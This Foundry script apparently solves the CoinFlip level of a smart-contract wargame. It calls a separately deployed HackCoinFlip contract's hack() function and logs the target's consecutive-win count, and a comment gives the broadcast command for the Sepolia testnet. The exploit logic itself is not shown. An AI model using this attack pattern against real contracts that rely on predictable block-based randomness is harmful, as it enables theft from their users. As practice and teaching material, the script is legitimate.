// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HackCoinFlip, CoinFlip} from "../src/level3.sol";

contract Level3Script is Script {
    // CoinFlip target;
    //your need to deploy a Hack contract first, and then call the hack function manually ten times in ten blocks
    function run(address hackAddress, address instanceAddress) external {
        // target = CoinFlip(instanceAddress);

        vm.startBroadcast();
        // HackCoinFlip hackContract = new HackCoinFlip(address(target));
        HackCoinFlip(hackAddress).hack();
        uint256 consecutiveWins = CoinFlip(instanceAddress).consecutiveWins();
        console.log("consecutiveWins: ", consecutiveWins);
        vm.stopBroadcast();
    }
}
//forge script script/level3.s.sol:Level3Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address,address)" 0xYourHackContractAddress 0xYourInstanceAddress
